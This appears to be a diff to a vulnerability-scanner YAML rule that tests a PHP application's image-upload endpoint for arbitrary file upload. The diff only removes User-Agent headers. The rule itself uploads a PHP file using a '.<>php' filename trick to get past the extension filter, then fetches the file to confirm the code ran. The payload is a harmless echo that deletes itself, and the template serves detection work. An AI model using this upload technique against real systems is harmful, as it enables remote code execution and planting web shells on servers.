@@ -6,7 +6,6 @@ rules:
   - method: POST
     path: /index.php?s=/home/page/uploadImg
     headers:
-      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
       Content-Type: "multipart/form-data; boundary=--------------------------835846770881083140190633"
     follow_redirects: false
     body: "----------------------------835846770881083140190633\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"{{r1}}.<>php\"\nContent-Type: text/plain\n\n<?php echo \"{{r2}}\"; unlink(__FILE__); ?>\n----------------------------835846770881083140190633--"
@@ -16,9 +15,6 @@ rules:
       (?P<date>\d{4}-\d{2}-\d{2})\\/(?P<file>[a-f0-9]+\.php)
   - method: GET
     path: /Public/Uploads/{{date}}/{{file}}
-    headers:
-      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
-      Accept-Encoding: "gzip, deflate"
     follow_redirects: false
     expression: |
       response.status == 200 && response.body.bcontains(bytes(r2))
